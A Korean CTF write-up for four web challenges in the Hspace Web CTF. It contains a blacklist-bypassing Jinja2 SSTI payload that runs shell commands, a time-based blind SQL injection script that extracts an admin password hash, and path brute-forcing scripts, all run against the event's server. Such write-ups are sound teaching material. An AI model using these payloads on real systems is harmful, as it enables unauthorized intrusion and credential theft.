# Hspace Web CTF

## 대회 일정
**2024-01-13 10:00 ~ 20:00**
### Writeup 

## 1. for_beginner

SSTI 취약점을 활용해 RCE 하는 문제였다.   
    
```python
@app.route('/')
def main():
    name = request.args.get("name", "World")
    return render_template_string(f'Hello {name}!!')
```    

Flask에서 랜더링 함수인 `render_template_string()`에서 `SSTI` 취약점이 발생한다.     
    
```python
blacklist = ['os','subprocesses','exec','vars','sys','"','\+',
             'open','rm','main','static','templates','ctf','rf',
             'spawnlp','execfile','dir','dev','tcp','sh','import',
             'built','__class__','for','request','\,','app','file',
             'url_for','\[','\]','config']

def Prevent_SSTI(input):
    for i in blacklist:
        res = re.search(i,input)
        if res:
            return True
    else:
        return False
```

키워드 위주로 필터링이 걸려있어 이를 우회해주면 된다. 

## Exploit Code
```python
http://3.34.190.217:1337/?name={{request[%22__%22+%22class%22+%22__%22].mro()[3].__subclasses__()[494](%27cat%20flag.txt%27,shell=True,stdout=-1).communicate()}}
```

### FLAG   
hspace{57a32c35915278d4de4ca21a8dc22b7f642a2a33e1508050c9498e1e48290e38}

## 2. for_beginner-SQL 
   
Blind SQL Injection을 사용하여 관리자 패스워드를 알아내는 문제였다. 

```php
<?php
session_start();
require_once "config/dbconn.php";

$userid = $_GET['userid'];
$password = $_GET['password'];

if(isset($userid) && isset($password)) {
    $query = "SELECT userid, password FROM user WHERE userid = '${userid}' and password = '".md5($password)."'";
    try {
        $result = $mysqli->query($query);
        $data = mysqli_fetch_array($result);
        if(isset($data) && $data[0] == "admin" && $data[1] === md5($password)){
            die($flag);
	    } else {
		    die("Wrong...");
	    }
    } catch(Exception $e) {
    }
} else {
    show_source(__FILE__);
}
?>
```
PHP에서 SQL Injection 취약점이 존재하는 함수인 `$mysqli->query($query);`를 사용하고 있다. 패스워드는 md5 해쉬 알고리즘을 사용하고 있어 userid를 통해 Blind SQL Injection을 수행하였다.    
    

## Exploit Code    
```python
import requests
import time

url = "http://3.34.190.217:2023/"
password = ""
length_password = 0
for i in range(64): 
    start = time.time() 
    r = requests.get(
                url, 
                params={
                    "userid": "aaaa' or if(length(password)={},sleep(3),false)#".format(i),
                    "password": "test"
                }
            )
    end = time.time() 
    if end - start >= 1.5: 
        length_password = i 
        print(f"Length of Password: {i}")
        break 
        
for i in range(1, length_password + 1):
    for j in range(32, 128):
        start = time.time()
        r = requests.get(
                url, 
                params={
                    "userid": "aaaa' or if(ascii(substr(password,{},1))={},sleep(3),false)#".format(i, j),
                    "password": "test"
                }
            )
        end = time.time()
        if end - start >= 1.5: 
            password += chr(j) 
            print(password)

print("Admin MD5 Password:", password) 
```     

```
Length of Password: 32
e
ed
edg
edge
edge6
edge6b
edge6b5
edge6b50
edge6b50S
edge6b50Se
edge6b50Se7
edge6b50Se7b
edge6b50Se7b5
edge6b50Se7b58
edge6b50Se7b582
edge6b50Se7b5826
edge6b50Se7b5826f
edge6b50Se7b5826fe
edge6b50Se7b5826fe4
edge6b50Se7b5826fe48
edge6b50Se7b5826fe48f
edge6b50Se7b5826fe48fc
edge6b50Se7b5826fe48fc1
edge6b50Se7b5826fe48fc1f
edge6b50Se7b5826fe48fc1f0
edge6b50Se7b5826fe48fc1f0f
edge6b50Se7b5826fe48fc1f0fe
edge6b50Se7b5826fe48fc1f0fe7
edge6b50Se7b5826fe48fc1f0fe77
edge6b50Se7b5826fe48fc1f0fe772
edge6b50Se7b5826fe48fc1f0fe772c
edge6b50Se7b5826fe48fc1f0fe772c4
edge6b50Se7b5826fe48fc1f0fe772c48
edge6b50Se7b5826fe48fc1f0fe772c48f
Admin MD5 Password: edge6b50Se7b5826fe48fc1f0fe772c48f
```

MD5 Decrypt: https://10015.io/tools/md5-encrypt-decrypt    
관리자의 MD5 패스워드를 알아내고 위 링크에 접속하여 복호화를 수행한 다음 `http://3.34.190.217:2023/?userid=admin&password=1q2w3e4r5t6y` 관리자 계정으로 로그인해주면 FLAG를 획득할 수 있다.     
          
### FLAG   
hspace{12cb8da4edbe2a3cba650182b86570772005aef5b3840fef41e46ad8}    
     

## Magic eye      
    
페이지에 접속하면 `Your starting point: h` 표시가 있고 클릭 시 `http://3.34.190.217:24915/h/`경로로 이동하고 `Not Found` 문구가 뜬다. 하지만, 200으로 응답이 오는 것을 확인했다. 

이외에 단서는 존재하지 않아 gobuster로 디렉터리 경로를 확인해보니  `http://3.34.190.217:24915/h/s/p/a/c/e`경로까지 접근이 가능했다.    
     
더이상 경로가 확인되지 않다가 경로 자체가 FLAG 라는 생각이 들어 `{` 문자를 추가해보니 200으로 응답되는 것을 확인했다.     

```
http://3.34.190.217:24915/h/s/p/a/c/e/{/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/2/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/2/e/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/2/e/6/
```
익스 코드를 작성하고 돌려보니 이와 같이 결과가 나왔고, `/`를 삭제하고 FLAG로 제출해봤는데 틀렸다고 나왔다. 그래서, `http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/2/e/6/` 경로에 접근해보니 `Wow, the final flag is (what_you_got) + _cab2038942053898e0e6486cebfd368a}` 문구가 존재했다.    

즉, 앞뒤로 플래그를 합쳐주면 된다.         

## Exploit Code     

```python 
import requests 
url = "http://3.34.190.217:24915"

real_url = f"{url}/h/s/p/a/c/e/"
for i in range(50): 
    for j in range(32, 128):
        c = chr(j)
        r= requests.get(real_url + c)
        if c in ["#", ".", "?"]: 
            continue 
        if r.status_code == 200:
            real_url += (c + "/")
            print(real_url)
```

### FLAG    
hspace{5afcf1de45c12f58dd0cfb2cfdfa22e6_cab2038942053898e0e6486cebfd368a}      
## web101    
     
이 문제도 앞과 유사하게 gobuster를 활용하여 파일들에 접근하여 FLAG 단서들을 찾는 문제였다. 

## Exploit Code
     
```txt
# /
# Part 1 
# hspace{D0

# /.git
# Part 2
# Acutally, it's not git repository.
# But the flag part2 is : n7_uuuuuu

# /flag.txt
# Part 3
# Wow, you tried flag.txt
# great :)
# Flag part 4 : rBu573r_i 

# /.index.php.swp
# Part 4
# Haha you find it.
# Also, it's not real swap file
# Here is your 3rd part of flag
# uuse_D1

# /admin
# Part 5
# n_R34lCTF_PL

# /robots.txt
# Part 6
# User-agent: *
# Allow: *
# Okay, the flag part6 is LLLLlllzzzz}
# Congratulations!

```     

### FLAG
hspace{D0n7_uuuuuuuuse_D1rBu573r_in_R34lCTF_PLLLLLlllzzzz}